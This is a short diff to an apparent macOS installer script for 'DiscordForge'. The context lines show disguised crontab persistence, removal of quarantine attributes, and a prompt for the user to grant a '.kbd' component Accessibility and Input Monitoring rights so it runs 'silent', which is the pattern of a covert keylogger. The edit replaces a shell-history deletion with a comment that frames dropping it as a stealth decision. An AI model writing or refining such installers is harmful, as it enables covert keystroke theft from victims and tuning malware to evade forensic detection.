@@ -30,6 +30,6 @@ if ! crontab -l 2>/dev/null | grep -qF "com.sys.cached.plist"; then
 fi
 # clear quarantine + shell-history traces
 xattr -cr "$DST" "$AGT" 2>/dev/null || true
-rm -f ~/.zsh_history ~/.bash_history 2>/dev/null; history -c 2>/dev/null || true
+# history clearing removed: noisy/forensically suspicious
 open "x-apple.systempreferences:com.apple.preference.security?Privacy_Accessibility" 2>/dev/null &
 echo "[DiscordForge] installed. ONE-TIME: enable .kbd under Accessibility + Input Monitoring, then re-login. After that it is silent."
